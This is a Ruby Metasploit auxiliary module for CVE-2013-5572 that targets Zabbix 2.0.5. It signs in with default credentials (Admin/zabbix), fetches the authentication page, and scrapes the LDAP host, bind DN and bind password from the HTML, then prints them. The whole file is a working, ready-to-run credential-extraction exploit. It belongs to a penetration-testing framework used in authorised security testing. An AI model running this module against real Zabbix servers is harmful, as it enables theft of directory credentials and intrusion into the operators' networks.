require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zabbix LDAP Password Extractor',
      'Description'    => %q{
          Zabbix 2.0.5 allows remote authenticated users to discover the LDAP bind password by leveraging management-console access
          and reading the ldap_bind_password value in the HTML source code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
                           'Pablo Gonzalez', # @pablogonzalezpe, module author
                           'h00die' # cleanup and submission
                          ],
      'Reference'      =>
        [
          ['CVE', '2013-5572'],
          ['URL', 'http://www.elladodelmal.com/2014/12/como-crear-el-modulo-metasploit-para-el.html'],
          ['EDB','36157']
        ],
      'DisclosureDate' => 'Sep 30 2013'
    ))

    register_options([
      OptString.new('ZABBIXUSER',     [true, 'Username for Zabbix', 'Admin']),
      OptString.new('ZABBIXPASSWORD', [true, 'Password for Zabbix', 'zabbix']),
      OptString.new('TARGETURI',      [true, 'Path Zabbix Authentication', '/zabbix/'])
    ], self.class)
  end

  def check
    vprint_status('start of check')
    res = send_request_cgi(
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, 'index.php')
      )
    vprint_status("#{res}")
    if res && res.body && res.body.to_s =~ /Zabbix 2\.0\.5/
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Unknown
  end

  def run
    cookie = login()
    if cookie
      res = send_request_cgi({
        #'host' => datastore['RHOST'],
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'authentication.php'),
        'cookie' => cookie,
        'Content-Type' => 'application/x-www-form-urlencoded'
        })
      if res && res.code && res.code == 200
        ldap_host(res)
        user_pass_domain(res)
        user_zabbix(res)
      else
        print_error('Request for vulnerable page failed.')
      end
    end
  end

  def login
    vprint_status("Attempting Login: #{datastore['ZABBIXUSER']}:#{datastore['ZABBIXPASSWORD']}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'Content-Type' => 'application/x-www-form-urlencoded',
      'method'       => 'POST',
      'vars_post'    => {
        'request'    => '',
        'name'       => datastore['ZABBIXUSER'],
        'password'   => datastore['ZABBIXPASSWORD'],
        'enter'      => 'Sign in'
      }
    )
    if res && res.redirect? #302
      vprint_status('Login Success')
      cookie = res.get_cookies
      return cookie
    else
      print_bad('Login Failure')
      nil
    end
  end

  def ldap_host(response)
    cut = response.body.split("ldap_host\" value=\"")[1]
    if cut != nil
      host = cut.split("\"")[0]
      print_good("LDAP Host: #{host}")
    else
      print_status('No LDAP Host Found')
    end
  end

  def user_pass_domain(response)
    cut = response.body.split("ldap_bind_dn\" value=\"")[1]
    if cut != nil
      user = cut.split("\"")[0]
      print_good("LDAP Bind Domain: #{user}")
    else
      print_status('No LDAP Bind Domain Found')
    end
    cut = response.body.split("name=\"ldap_bind_password\" value=\"")[1]
    if cut != nil
      pass = cut.split("\"")[0]
      print_good("LDAP Bind Password: #{pass}")
    else
      print_status('No LDAP Bind Password Found')
    end
  end

  def user_zabbix(response)
    cut = response.body.split("user\" value=\"")[1]
    if cut != nil
      user = cut.split("\"")[0]
      print_good("Login (user): #{user}")
    else
      print_status('No Login (user) found')
    end
  end
end
